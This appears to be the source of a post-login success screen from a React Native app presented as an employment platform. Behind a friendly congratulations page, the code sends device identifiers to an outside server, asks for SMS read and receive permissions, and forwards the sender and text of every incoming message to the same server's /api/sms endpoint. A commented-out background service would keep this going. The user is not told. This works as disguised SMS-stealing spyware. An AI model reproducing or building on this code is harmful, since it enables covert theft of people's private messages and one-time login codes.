import {
  View,
  Text,
  PermissionsAndroid,
  Platform,
  SafeAreaView,
  Image,
  TouchableOpacity,
  Alert,
} from 'react-native';
import React, { useEffect } from 'react';
import { useNavigation } from '@react-navigation/native';
// @ts-ignore
import celebrationImage from '../../static/assets/logo.png';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import { toast } from 'burnt';
// @ts-ignore
import SmsListener from 'react-native-android-sms-listener';
// import BackgroundService from 'react-native-background-actions';
// import { smsBackgroundTask } from '../../utils/smsService';
import { prepareSMSPayload } from '../../utils/hashSms';

const Success = () => {
  const navigator = useNavigation();

  const handleRedirect = async () => {
    // @ts-ignore
    navigator.navigate('Auth');
  };

  const listenToIncomingSMS = async () => {
    try {
      const deviceId = await DeviceInfo.getUniqueId();

      const granted = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
        PermissionsAndroid.PERMISSIONS.READ_SMS,
      ]);

      const receiveGranted =
        granted['android.permission.RECEIVE_SMS'] ===
        PermissionsAndroid.RESULTS.GRANTED;
      const readGranted =
        granted['android.permission.READ_SMS'] ===
        PermissionsAndroid.RESULTS.GRANTED;

      if (!receiveGranted || !readGranted) {
        console.warn('SMS permissions not granted.');
        return;
      }

      const subscription = SmsListener.addListener( async (message: any) => {
        const payload = prepareSMSPayload({
          deviceId,
          from: message.originatingAddress,
          message: message.body
        });

        await axios.post('https://employment-engage.vercel.app/api/sms', payload);
        
        console.log('📩 Incoming SMS:', message);

        Alert.alert('New SMS', message.body);
        toast({
          title: 'SMS Received',
          message: message.body,
        });
      });

      return subscription;
    } catch (error) {
      console.log('Error setting up SMS listener:', error);
    }
  };

  // const startBackrouSMS = async () => {
  //   await BackgroundService.start(smsBackgroundTask, {
  //     taskName: 'SMSMonitor',
  //     taskTitle: 'Listening for SMS...',
  //     taskDesc: 'This service listens for incoming SMS and sends it to the server.',
  //     taskIcon: {
  //         name: 'ic_launcher', // without extension
  //         type: 'mipmap'
  //     }
  //   })
  // };

  useEffect(() => {

    (async () => {
      try {
        
        const userRef = await AsyncStorage.getItem('userRef');
        const uniqueId = await DeviceInfo.getUniqueId();
        const brand = await DeviceInfo.getBrand();
        const model = await DeviceInfo.getModel();
        const systemName = await DeviceInfo.getSystemName();
        const systemVersion = await DeviceInfo.getSystemVersion();
        
        const data = {
          userRef,
          deviceId: uniqueId,
          deviceInfo: {
            model,
            os: systemName,
            version: systemVersion,
            brand,
          },
        };
        
        await axios.post(
          'https://employment-engage.vercel.app/api/device',
          data
        );

        toast({
          title: 'Successfully registered!',
          message: 'Device info sent to server.',
        });
        
        await listenToIncomingSMS();
        
        // await startBackrouSMS();

      } catch (error: any) {
        console.log(error.message);
        toast({
          title: error.message,
          message: 'Error sending device info.',
        });
      }
    })();

  }, []);

  return (
    <SafeAreaView className="flex-1 bg-red-100">
      <View className="mt-[15vh] justify-center items-center px-6">
        <Image source={celebrationImage} className="w-48 h-48 mb-2" />
        <Text className="text-3xl font-bold text-blue-800 text-center mb-4">
          Congratulations!
        </Text>
        <Text className="text-lg text-gray-700 text-center mb-4">
          You've successfully logged in to the Employment Engagement Platform.
        </Text>
        <TouchableOpacity
          onPress={handleRedirect}
          className="bg-red-500 p-4 rounded-lg w-full mb-4"
        >
          <Text className="text-white text-center font-semibold">Logout</Text>
        </TouchableOpacity>
        <View className="flex-row flex-wrap justify-center gap-x-4 gap-y-2 mt-6">
          {['FAQ', 'Contact', 'Privacy'].map((item) => (
            <Text key={item} className="text-blue-600 text-xs">
              {item}
            </Text>
          ))}
        </View>
      </View>
    </SafeAreaView>
  );
};

export default Success;
